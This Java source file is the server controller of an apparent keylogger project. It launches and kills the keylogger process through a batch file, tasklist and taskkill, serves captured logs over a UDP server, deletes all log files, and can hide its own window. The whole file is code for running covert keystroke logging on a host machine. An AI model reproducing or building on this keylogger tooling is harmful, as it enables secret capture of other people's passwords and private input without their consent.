package com.hao.keylogger.controllers.server;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.swing.JOptionPane;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.utils.Resources;
import com.hao.keylogger.views.ServerView;

public class ServerLogController {
	ServerView view;
	Log log;
	UDPServerHelper udpServerHelper;
	//private final int DEFAULT_PORT = 4567;

	private boolean isServerStarted = false;
	private boolean isLoggerStarted = false;
	public ServerLogController(ServerView view, Log log) {
		this.view = view;
		this.log = log;
		view.setController(this);
		view.setHost(UDPServerHelper.getLocalHostIP());
		view.setPort(Resources.DEFAULT_PORT);
		toggleServerOnOrOff();
		updateLoggerState();
	}

	private void updateLoggerState() {
		view.updateLoggerState(isLoggerRunning());
	}

	public void toggleServerOnOrOff() {
		if (!isServerStarted) {
			String hostName = view.getHost();
			int port = view.getPort();

			// init
			udpServerHelper = new UDPServerHelper(hostName, port);
			udpServerHelper.setController(this);

			// start server and serve clients
			if (udpServerHelper.startServer()) {
				appendToMonitory("Server started at " + hostName + ":" + port);
				isServerStarted = true;
				view.updateViewWhenServerIsStarted();
				//hideForm();
			}
			else {
				view.appendToMonitor("Can not start server!\n");
				showForm();
			}
		}
		else {
			if (stopServer()) {
				isServerStarted = false;
				view.updateViewWhenServerIsStopped();
			}
		}
	}

	public boolean stopServer() {
		if (udpServerHelper.stopServer()) {
			appendToMonitory("Server stopped.");
			return true;
		}
		return false;
	}

	public void appendToMonitory(String msg) {
		view.appendToMonitor(new SimpleDateFormat("dd/MM/yyyy hh:mm:ss").format(new Date()));
		view.appendToMonitor(": ");
		view.appendToMonitor(msg);
		view.appendToMonitor("\n");

	}

	public boolean startLogger() {			
		if (isLoggerRunning()) {
			return true;
		}
		// if key logger is not running		
		try {
			String programPath = new File(Resources.KEY_LOGGER_PATH).getAbsolutePath();
			Runtime.getRuntime().exec(Resources.START_LOGGER_BATCH_FILE_NAME);
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}

	private boolean isLoggerRunning() {
		// check if key logger is running
				String line;
				String pidInfo = "";

				Process p;
				try {
					p = Runtime.getRuntime().exec(System.getenv("windir") + "//system32//" + "tasklist.exe");

					BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

					while ((line = input.readLine()) != null) {
						pidInfo += line;
					}
					input.close();
				} catch (IOException e) {
					e.printStackTrace();
				}

				if (pidInfo.contains(Resources.KEY_LOGGER_NAME)) {
					return true;
				}
		return false;
	}

	public boolean stopLogger() {
		try {
			Runtime.getRuntime().exec("taskkill /F /IM " + Resources.KEY_LOGGER_NAME);
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}

	public boolean deleteAllHostLogs() {
		File logFolder = new File(Resources.LOGS_DIRECTORY);
		for (File f : logFolder.listFiles()) {
			try {
				f.delete();
			} catch (Exception e) {
				return false;
			}
		}
		appendToMonitory("Deleted all logs!");
		return true;
	}

	public void toggleLogger() {
		if (isLoggerRunning()) {
			if (stopLogger()) {
				view.updateLoggerState(false);
				appendToMonitory("Key logger stopped!");
			}
		}
		else {
			if (startLogger()) {
				view.updateLoggerState(true);
				appendToMonitory("Key logger started!");
			}
		}
	}

	public void hideForm() {
		view.setVisible(false);
	}
	
	public void showForm() {
		view.setVisible(true);
	}

}
